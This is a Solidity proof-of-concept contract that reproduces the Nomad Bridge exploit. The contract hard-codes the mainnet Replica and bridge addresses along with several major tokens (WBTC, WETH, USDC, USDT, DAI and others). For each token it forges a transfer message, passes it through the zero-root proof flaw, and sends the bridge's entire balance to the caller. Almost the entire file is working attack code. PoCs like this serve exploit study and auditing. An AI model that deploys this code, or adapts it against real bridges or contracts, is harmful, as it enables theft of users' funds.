//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {console} from "forge-std/console.sol";

// POC for Nomad Bridge exploit: zero-root treated as valid, allowing arbitrary message processing
interface IReplica {
    function process(bytes memory _message) external returns (bool _success);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

contract Attacker {
    address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
    address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
    address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;

    // Nomad domain IDs
    uint32 constant ETHEREUM = 0x657468; // "eth"
    uint32 constant MOONBEAM = 0x6265616d; // "beam"

    // tokens
    address[] public tokens = [
        0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
        0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
        0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
        0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
        0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
        0xD417144312DbF50465b1C641d016962017Ef6240 // CQT
    ];

    // Iterate through tokens and craft payloads to exploit acceptableRoot zero-root flaw
    function attack() external {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            uint256 amount_bridge = IERC20(token).balanceOf(ERC20_BRIDGE);

            console.log("[*] Exploiting", amount_bridge / 10 ** IERC20(token).decimals(), IERC20(token).symbol());
            console.log("Attacker balance before:", IERC20(token).balanceOf(msg.sender));

            // Generate the payload with all of the tokens stored on the bridge
            bytes memory payload = genPayload(msg.sender, token, amount_bridge);

            // Process message bypassing proof validation due to zero-root initialization bug
            bool success = IReplica(REPLICA).process(payload);
            require(success, "Failed to process the payload");

            console.log(
                "Attacker balance after: ", IERC20(token).balanceOf(msg.sender) / 10 ** IERC20(token).decimals()
            );
        }
    }

    // This is _message data structure :
    /*
        bytes memory chainId = "beam";   // hex(6265616d) == dec(1650811245), Ref: https://docs.nomad.xyz/developers/environments/domain-chain-ids
        bytes memory sender = hex"D3dfD3eDe74E0DCEBC1AA685e151332857efCe2d";
        bytes memory nonce = hex"13d6";         // == dec"5078"
        bytes memory localDomain = hex"657468"; // == str"eth"
        bytes memory recipientAddress = hex"88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3";    // BridgeRouter address. this will callback BridgeRouter.handle(_message)
            ------------ __message that call BridgeRouter.handle(__message) ------------
        uint32 _domain = 657468;    // == str("eth")
        bytes32 _id = abi.encodePacked(address(WBTC));
        bytes32 _to = abi.encodePacked(address(this));
        uint256 _amnt = 100 * 1e8; // 100 WBTC
        bytes32 _detailsHash = keccak256(abi.encodePacked(bytes("Wrapped BTC").length, "Wrapped BTC", bytes("WBTC").length, "WBTC", uint8(8)));
        bytes29 _tokenId = BridgeMessage.formatTokenId(_domain, _id);
        bytes29 _action = BridgeMessage.formatTransfer(_to, _amnt, _detailsHash);
        bytes memory __message = BridgeMessage.formatMessage(_tokenId, _action);
        -----------------------------------------------------------------------------
        bytes memory _message = bytes.concat(chainId, sender, nonce, localDomain, recipientAddress, __message);
    */

    // Build message payload mimicking valid proof to bypass Replica zero-root check
    function genPayload(address recipient, address token, uint256 amount) internal pure returns (bytes memory payload) {
        payload = abi.encodePacked(
            MOONBEAM, // Home chain domain
            uint256(uint160(BRIDGE_ROUTER)), // Sender: bridge
            uint32(0), // Dst nonce
            ETHEREUM, // Dst chain domain
            uint256(uint160(ERC20_BRIDGE)), // Recipient (Nomad ERC20 bridge)
            ETHEREUM, // Token domain
            uint256(uint160(token)), // token id (e.g. WBTC)
            uint8(0x3), // Type - transfer
            uint256(uint160(recipient)), // Recipient of the transfer
            uint256(amount), // Amount
            uint256(0) // Optional: Token details hash
            // keccak256(
            //     abi.encodePacked(
            //         bytes(tokenName).length,
            //         tokenName,
            //         bytes(tokenSymbol).length,
            //         tokenSymbol,
            //         tokenDecimals
            //     )
            // )
        );
    }
}
